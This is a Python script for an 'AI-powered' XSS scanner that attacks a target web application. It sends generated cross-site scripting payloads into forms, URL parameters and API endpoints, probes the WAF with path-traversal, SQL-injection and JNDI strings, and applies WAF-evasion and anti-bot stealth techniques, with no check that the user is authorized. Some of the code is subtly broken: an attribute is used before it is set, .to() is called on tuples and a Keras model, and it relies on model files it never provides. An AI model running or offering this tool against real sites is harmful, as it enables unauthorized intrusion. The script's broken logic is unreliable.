import torch
import transformers
import numpy as np
import requests
from bs4 import BeautifulSoup
from urllib.parse import quote, unquote, urlparse
import html
import base64
import re
import json
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from fake_useragent import UserAgent
from tensorflow.keras.models import load_model
import tldextract

class UltimateXSSHunter:
    def __init__(self, target_url):
        self.target_url = self.normalize_url(target_url)
        self.session = self.create_stealth_session()
        self.driver = self.init_selenium()
        self.ua = UserAgent()
        self.device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
        
        # Load AI models
        self.payload_generator = self.load_ai_model('payload_generator')
        self.waf_classifier = self.load_ai_model('waf_classifier')
        self.context_analyzer = self.load_ai_model('context_analyzer')
        self.evasion_strategist = load_model('evasion_strategist.h5')
        
        # Configuration
        self.max_threads = 10
        self.timeout = 15
        self.stealth_mode = True
        self.advanced_evasion = True
        self.report = {
            "target": self.target_url,
            "vulnerabilities": [],
            "waf_info": {},
            "scan_metrics": {
                "tested_payloads": 0,
                "bypassed_waf": 0,
                "execution_success": 0,
                "reflection_success": 0
            }
        }

    def normalize_url(self, url):
        """Ensure URL has proper scheme and format"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}" if not parsed.path.endswith('/') else f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    def create_stealth_session(self):
        """Create a stealthy requests session with random headers"""
        session = requests.Session()
        session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        })
        return session

    def init_selenium(self):
        """Initialize headless Chrome with stealth options"""
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument(f"user-agent={self.ua.random}")
        
        # Anti-bot evasion techniques
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        driver = webdriver.Chrome(options=chrome_options)
        
        # Execute stealth JS
        with open('stealth.min.js') as f:
            driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
                "source": f.read()
            })
            
        return driver

    def load_ai_model(self, model_type):
        """Load appropriate AI model based on type"""
        if model_type == 'payload_generator':
            model = transformers.T5ForConditionalGeneration.from_pretrained('t5-xss-generator')
            tokenizer = transformers.T5Tokenizer.from_pretrained('t5-xss-generator')
            return (model, tokenizer).to(self.device)
            
        elif model_type == 'waf_classifier':
            return load_model('waf_classifier.h5').to(self.device)
            
        elif model_type == 'context_analyzer':
            model = transformers.BertForSequenceClassification.from_pretrained('bert-context-analyzer')
            tokenizer = transformers.BertTokenizer.from_pretrained('bert-context-analyzer')
            return (model, tokenizer).to(self.device)

    def generate_ai_payloads(self, context, count=15):
        """Generate context-aware XSS payloads using AI"""
        model, tokenizer = self.payload_generator
        input_text = f"Generate {count} XSS payloads for: {context['element_type']} in {context['page_context']} context with {context['waf_type']} WAF"
        
        input_ids = tokenizer.encode(input_text, return_tensors="pt").to(self.device)
        outputs = model.generate(
            input_ids,
            max_length=100,
            num_return_sequences=count,
            do_sample=True,
            top_k=50,
            top_p=0.95,
            temperature=0.7,
            num_beams=5
        )
        
        payloads = [tokenizer.decode(output, skip_special_tokens=True) 
                   for output in outputs]
        
        # Post-process payloads
        return [self.clean_payload(p) for p in payloads if self.validate_payload(p)]

    def clean_payload(self, payload):
        """Remove unwanted artifacts from AI-generated payloads"""
        payload = re.sub(r'^\d+\.\s*', '', payload)  # Remove numbering
        payload = payload.replace('"', "'")  # Standardize quotes
        payload = payload.strip()
        return payload

    def validate_payload(self, payload):
        """Validate that payload meets basic XSS criteria"""
        xss_patterns = [
            r'<script[^>]*>.*?</script>',
            r'on\w+\s*=',
            r'javascript:',
            r'data:text/html',
            r'&#?\w+;'
        ]
        return any(re.search(pattern, payload, re.I) for pattern in xss_patterns)

    def analyze_page(self, html_content):
        """Perform deep analysis of page content and structure"""
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Extract page context using AI
        page_text = soup.get_text()[:512]
        context = self.get_page_context(page_text)
        
        # Find all input points
        input_points = self.find_input_points(soup)
        
        return {
            "context": context,
            "input_points": input_points,
            "technologies": self.detect_technologies(html_content)
        }

    def get_page_context(self, text):
        """Classify page context using AI"""
        model, tokenizer = self.context_analyzer
        inputs = tokenizer(text, return_tensors="pt", truncation=True, padding=True).to(self.device)
        
        with torch.no_grad():
            outputs = model(**inputs)
        
        context_types = ['reflected', 'stored', 'dom', 'json', 'template']
        predicted_idx = torch.argmax(outputs.logits).item()
        confidence = torch.softmax(outputs.logits, dim=1)[0][predicted_idx].item()
        
        return {
            "type": context_types[predicted_idx],
            "confidence": confidence
        }

    def find_input_points(self, soup):
        """Discover all potential injection points"""
        input_points = []
        
        # HTML forms
        for form in soup.find_all('form'):
            form_data = {
                "type": "form",
                "action": form.get('action') or self.target_url,
                "method": form.get('method', 'get').upper(),
                "inputs": [],
                "attributes": {k: v for k, v in form.attrs.items()}
            }
            
            for inp in form.find_all(['input', 'textarea', 'select']):
                if inp.get('name'):
                    form_data["inputs"].append({
                        "name": inp.get('name'),
                        "type": inp.get('type', 'text'),
                        "tag": inp.name,
                        "attributes": {k: v for k, v in inp.attrs.items()}
                    })
            
            if form_data["inputs"]:
                input_points.append(form_data)
        
        # Individual inputs outside forms
        for inp in soup.find_all(['input', 'textarea', 'select']):
            if inp.get('name') and not any(inp.get('name') in (i['name'] for i in point['inputs']) 
                                         for point in input_points if point['type'] == 'form'):
                input_points.append({
                    "type": "input",
                    "name": inp.get('name'),
                    "tag": inp.name,
                    "attributes": {k: v for k, v in inp.attrs.items()}
                })
        
        # AJAX endpoints from JavaScript
        js_endpoints = self.extract_js_endpoints(soup)
        input_points.extend(js_endpoints)
        
        return input_points

    def extract_js_endpoints(self, soup):
        """Extract potential API endpoints from JavaScript"""
        endpoints = []
        scripts = soup.find_all('script')
        
        for script in scripts:
            if script.src:
                try:
                    js_content = requests.get(script.src, timeout=5).text
                except:
                    continue
            else:
                js_content = script.text
            
            # Find AJAX calls
            patterns = [
                r'\.get\(["\']([^"\']+)["\']',
                r'\.post\(["\']([^"\']+)["\']',
                r'fetch\(["\']([^"\']+)["\']',
                r'axios\.\w+\(["\']([^"\']+)["\']'
            ]
            
            for pattern in patterns:
                for match in re.finditer(pattern, js_content):
                    endpoint = match.group(1)
                    if not endpoint.startswith(('http', '//')):
                        endpoint = self.target_url + endpoint if endpoint.startswith('/') else f"{self.target_url}/{endpoint}"
                        endpoints.append({
                            "type": "api",
                            "endpoint": endpoint,
                            "method": "GET" if 'get' in match.group(0).lower() else "POST",
                            "source": "javascript"
                        })
        
        return endpoints

    def detect_technologies(self, html_content):
        """Detect web technologies in use"""
        tech = {
            "frameworks": [],
            "server": None,
            "security": []
        }
        
        # Check common framework signatures
        framework_patterns = {
            "WordPress": r'wp-|wordpress',
            "Joomla": r'joomla',
            "Drupal": r'drupal',
            "React": r'react|__react',
            "Angular": r'ng-|angular',
            "Vue": r'vue|v-',
            "Laravel": r'laravel'
        }
        
        for name, pattern in framework_patterns.items():
            if re.search(pattern, html_content, re.I):
                tech["frameworks"].append(name)
        
        # Check server headers
        try:
            response = self.session.head(self.target_url, timeout=5)
            server = response.headers.get('Server', '')
            if server:
                tech["server"] = server
                
            # Check security headers
            security_headers = [
                'Content-Security-Policy',
                'X-Frame-Options',
                'X-XSS-Protection',
                'X-Content-Type-Options',
                'Strict-Transport-Security'
            ]
            
            for header in security_headers:
                if header in response.headers:
                    tech["security"].append(header)
        except:
            pass
        
        return tech

    def detect_waf(self):
        """Detect and classify WAF with AI"""
        test_payloads = [
            "../../../etc/passwd",
            "<script>alert(1)</script>",
            "' OR '1'='1",
            "${jndi:ldap://test}"
        ]
        
        features = []
        
        for payload in test_payloads:
            try:
                response = self.session.get(
                    self.target_url,
                    params={"test": payload},
                    timeout=5
                )
                
                # Extract features
                features.extend([
                    response.status_code,
                    response.elapsed.total_seconds(),
                    int('blocked' in response.text.lower()),
                    int('forbidden' in response.text.lower()),
                    int('security' in response.text.lower()),
                    int('waf' in response.text.lower())
                ])
                
                # Header features
                headers = response.headers
                features.extend([
                    int('cloudflare' in headers.get('Server', '').lower()),
                    int('mod_security' in headers.get('Server', '').lower()),
                    int('aws' in headers.get('Server', '').lower()),
                    int('akamai' in headers.get('Server', '').lower())
                ])
                
            except Exception as e:
                features.extend([0]*10)  # Pad with zeros if request fails
                continue
        
        # Normalize features
        features = np.array(features).reshape(1, -1)
        features = (features - features.mean()) / (features.std() + 1e-8)
        
        # Predict with AI model
        prediction = self.waf_classifier.predict(features)
        waf_types = ['Cloudflare', 'ModSecurity', 'AWS WAF', 'Akamai', 'None']
        predicted_idx = np.argmax(prediction)
        
        return {
            "type": waf_types[predicted_idx],
            "confidence": float(prediction[0][predicted_idx]),
            "features": features.tolist()
        }

    def generate_evasion_strategies(self, payload, waf_type, context):
        """Generate WAF evasion strategies using AI"""
        # Convert to numerical representation
        waf_mapping = {'Cloudflare': 0, 'ModSecurity': 1, 'AWS WAF': 2, 'Akamai': 3, 'None': 4}
        context_mapping = {'reflected': 0, 'stored': 1, 'dom': 2, 'json': 3, 'template': 4}
        
        # Create feature vector
        features = np.zeros((1, 512))
        features[0, waf_mapping[waf_type]] = 1
        features[0, 5 + context_mapping[context['type']]] = context['confidence']
        
        # Add payload characteristics
        features[0, 10] = int('<' in payload)
        features[0, 11] = int('>' in payload)
        features[0, 12] = int('script' in payload)
        features[0, 13] = int('on' in payload[:10])
        features[0, 14] = int('javascript:' in payload)
        
        # Predict optimal evasion strategy
        strategy = self.evasion_strategist.predict(features)
        
        # Apply strategy
        strategies = [
            lambda x: x,  # No evasion
            lambda x: x.replace('<', '%3C').replace('>', '%3E'),  # URL encoding
            lambda x: base64.b64encode(x.encode()).decode(),  # Base64
            lambda x: ''.join([f'&#{ord(c)};' for c in x]),  # HTML entities
            lambda x: x.replace(' ', '/**/'),  # Comment splitting
            lambda x: x.upper(),  # Case manipulation
            lambda x: x.replace('script', 'scr\x00ipt'),  # Null byte
            lambda x: x + '/*' + ''.join(random.choices('abcdef0123456789', k=8)) + '*/',  # Random comments
            lambda x: html.escape(x[:len(x)//2]) + x[len(x)//2:],  # Partial encoding
            lambda x: ''.join([c + '\u200B' for c in x])  # Zero-width spaces
        ]
        
        # Select top 3 strategies based on model output
        top_strategies = np.argsort(strategy[0])[-3:]
        evaded_payload = payload
        for strat_idx in reversed(top_strategies):
            evaded_payload = strategies[int(strat_idx)](evaded_payload)
        
        return evaded_payload

    def test_payload(self, input_point, payload, context, waf_info):
        """Test a payload against an input point with evasion"""
        self.report["scan_metrics"]["tested_payloads"] += 1
        
        try:
            # Apply WAF evasion if needed
            if waf_info["type"] != "None" and self.advanced_evasion:
                payload = self.generate_evasion_strategies(payload, waf_info["type"], context)
                self.report["scan_metrics"]["bypassed_waf"] += 1
            
            if input_point["type"] == "form":
                # Prepare form data
                form_data = {}
                for inp in input_point["inputs"]:
                    if inp["type"] not in ["hidden", "submit"]:
                        form_data[inp["name"]] = payload
                    else:
                        form_data[inp["name"]] = inp.get("value", "")
                
                # Submit form
                if input_point["method"] == "GET":
                    response = self.session.get(
                        input_point["action"],
                        params=form_data,
                        timeout=self.timeout
                    )
                else:
                    response = self.session.post(
                        input_point["action"],
                        data=form_data,
                        timeout=self.timeout
                    )
                
                # Check for reflection
                reflected = payload in response.text
                
                # Check for DOM execution
                self.driver.get(response.url)
                dom_executed = self.check_dom_execution()
                
            elif input_point["type"] == "input":
                # Test as URL parameter
                test_url = f"{self.target_url}?{input_point['name']}={payload}"
                self.driver.get(test_url)
                reflected = payload in self.driver.page_source
                dom_executed = self.check_dom_execution()
                
            elif input_point["type"] == "api":
                # Test API endpoint
                headers = {
                    "Content-Type": "application/json",
                    "X-Requested-With": "XMLHttpRequest"
                }
                
                if input_point["method"] == "GET":
                    response = self.session.get(
                        input_point["endpoint"],
                        params={"input": payload},
                        headers=headers,
                        timeout=self.timeout
                    )
                else:
                    response = self.session.post(
                        input_point["endpoint"],
                        json={"input": payload},
                        headers=headers,
                        timeout=self.timeout
                    )
                
                reflected = payload in response.text
                dom_executed = False  # APIs typically don't execute DOM XSS
            
            # Record results
            if reflected or dom_executed:
                vuln = {
                    "input_point": input_point,
                    "payload": payload,
                    "type": "reflected" if reflected else "dom",
                    "context": context["type"],
                    "confidence": 0.9 if dom_executed else 0.7,
                    "waf_bypassed": waf_info["type"] != "None"
                }
                
                self.report["vulnerabilities"].append(vuln)
                
                if dom_executed:
                    self.report["scan_metrics"]["execution_success"] += 1
                if reflected:
                    self.report["scan_metrics"]["reflection_success"] += 1
                
                return True
            
            return False
            
        except Exception as e:
            print(f"Error testing payload: {str(e)}")
            return False

    def check_dom_execution(self):
        """Check if payload executed in DOM"""
        try:
            # Check for alert
            WebDriverWait(self.driver, 1).until(EC.alert_is_present())
            alert = self.driver.switch_to.alert
            alert.accept()
            return True
        except:
            pass
        
        # Check for other execution indicators
        scripts = self.driver.find_elements(By.TAG_NAME, 'script')
        for script in scripts:
            if "alert" in script.get_attribute('innerHTML'):
                return True
                
        return False

    def scan(self):
        """Main scanning workflow"""
        print(f"[*] Starting Ultimate XSS Scan on {self.target_url}")
        
        # Initial reconnaissance
        print("[*] Performing initial reconnaissance...")
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            page_analysis = self.analyze_page(response.text)
            waf_info = self.detect_waf()
            
            self.report["waf_info"] = waf_info
            self.report["technologies"] = page_analysis["technologies"]
            
            print(f"[*] Detected WAF: {waf_info['type']} (Confidence: {waf_info['confidence']:.2f})")
            print(f"[*] Page Context: {page_analysis['context']['type']} (Confidence: {page_analysis['context']['confidence']:.2f})")
            print(f"[*] Found {len(page_analysis['input_points'])} input points")
            
        except Exception as e:
            print(f"[!] Initial reconnaissance failed: {str(e)}")
            return
        
        # Multi-threaded scanning
        print("[*] Starting vulnerability testing...")
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            
            for point in page_analysis["input_points"]:
                # Generate context for AI
                context = {
                    "element_type": point.get("tag", "input"),
                    "page_context": page_analysis["context"]["type"],
                    "waf_type": waf_info["type"]
                }
                
                # Generate payloads for this input point
                payloads = self.generate_ai_payloads(context)
                
                for payload in payloads:
                    futures.append(executor.submit(
                        self.test_payload,
                        point,
                        payload,
                        page_analysis["context"],
                        waf_info
                    ))
            
            # Monitor progress
            for future in as_completed(futures):
                future.result()  # We're already storing results in the report
        
        # Generate final report
        self.generate_report()
        print(f"[+] Scan completed! Found {len(self.report['vulnerabilities'])} vulnerabilities")
        print(f"[*] Report saved to xss_scan_report.json")

    def generate_report(self):
        """Generate comprehensive JSON report"""
        # Remove duplicates
        unique_vulns = []
        seen = set()
        
        for vuln in self.report["vulnerabilities"]:
            key = (
                vuln["input_point"]["type"],
                vuln["input_point"].get("name", ""),
                vuln["payload"][:100],
                vuln["type"]
            )
            
            if key not in seen:
                seen.add(key)
                unique_vulns.append(vuln)
        
        self.report["vulnerabilities"] = unique_vulns
        
        # Add severity ratings
        for vuln in self.report["vulnerabilities"]:
            if vuln["type"] == "dom":
                vuln["severity"] = "High"
            elif vuln["waf_bypassed"]:
                vuln["severity"] = "Medium"
            else:
                vuln["severity"] = "Low"
        
        # Save to file
        with open("xss_scan_report.json", "w") as f:
            json.dump(self.report, f, indent=2)

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Ultimate AI-Powered XSS Scanner")
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads to use")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds")
    parser.add_argument("--no-evasion", action="store_false", dest="evasion", help="Disable WAF evasion techniques")
    
    args = parser.parse_args()
    
    scanner = UltimateXSSHunter(args.url)
    scanner.max_threads = args.threads
    scanner.timeout = args.timeout
    scanner.advanced_evasion = args.evasion
    
    try:
        scanner.scan()
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        scanner.generate_report()
    except Exception as e:
        print(f"[!] Critical error: {str(e)}")